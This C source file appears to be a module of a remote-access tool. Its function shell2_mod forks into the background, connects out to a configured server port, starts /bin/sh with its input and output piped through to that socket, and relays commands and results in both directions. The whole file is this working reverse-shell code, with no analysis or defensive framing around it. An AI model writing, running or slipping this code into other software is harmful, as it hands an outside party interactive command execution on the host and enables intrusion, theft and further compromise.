#include "refect.h"
extern struct client_cfg cfg;
int shell2_mod(void)
{
	pid_t pid2;
	int sockfd;
 	int p2cfd[2];
    int c2pfd[2];

	pid_t pid;
	pid2 = fork();
	if (pid2 > 0)
	{
		return 0;
	}
	else if (pid2 < 0)
	{
		return 1;
	}

	sockfd = connect_server(cfg.res_port);

	if (sockfd < 0)
	{
		printf("Can't connect server, port %d \n", cfg.res_port);
		exit(1);
	}

	if (pipe(p2cfd) != 0)
    {
		close(sockfd);
        exit(1);
    }
    if (pipe(c2pfd) != 0)
    {
		close(sockfd);
        close(p2cfd[0]);
        close(p2cfd[1]);
        exit(1);
    }
	
	pid = fork();
	if (pid == 0)
	{
		int in;
        int out;

        in = c2pfd[1];
        close(c2pfd[0]);
        out = p2cfd[0];
        close(p2cfd[1]);
        execl_shell(out, in);
		close(in);
		close(out);
		exit(0);
	}
	else
	{
		int in;
        int out;
        
        in = p2cfd[1];
        close(p2cfd[0]);
        out = c2pfd[0];
        close(c2pfd[1]);

        io2shell(in, out, sockfd);
		kill(pid, SIGKILL);
		close(in);
		close(out);
	}
	close(sockfd);
	exit(0);	
}

int execl_shell(int infd, int outfd)
{
    dup2(infd, 0);
    dup2(outfd, 1);
    dup2(outfd, 2);
    execl("/bin/sh", "sh", (char *) 0);
    close(infd);
    close(outfd);
    return 0;
}
int io2shell(int infd, int outfd, int sockfd)
{
    int result, nread;
    struct timeval timeout;
    char buffer[BUFSIZ + 1];
    fd_set inputs, testfds;

    FD_ZERO(&inputs);
    FD_SET(sockfd, &inputs);
    FD_SET(outfd, &inputs);

    while (1)
    {
        testfds = inputs;
        timeout.tv_sec = 20;
        
        result = select(FD_SETSIZE, &testfds, 
					NULL, NULL, &timeout);
        if (result ==  -1)
        {
            return -1;
            
        } else if (result == 0)
        {
            printf("timeout\n");
        }
        else 
        {
            if (FD_ISSET(sockfd, &testfds))
            {
                nread = read(sockfd, buffer, BUFSIZ);
				if (nread == 0)
				{
					return 0;
				}
                buffer[nread] = 0;
                printf("GET INPUT: %s", buffer);
                write(infd, buffer, nread);
            }
			if (FD_ISSET(outfd, &testfds))
            {
                nread = read(outfd, buffer, BUFSIZ);
                buffer[nread] = 0;
                write(sockfd, buffer, nread);
            }

		}
	}

	return 0;

}


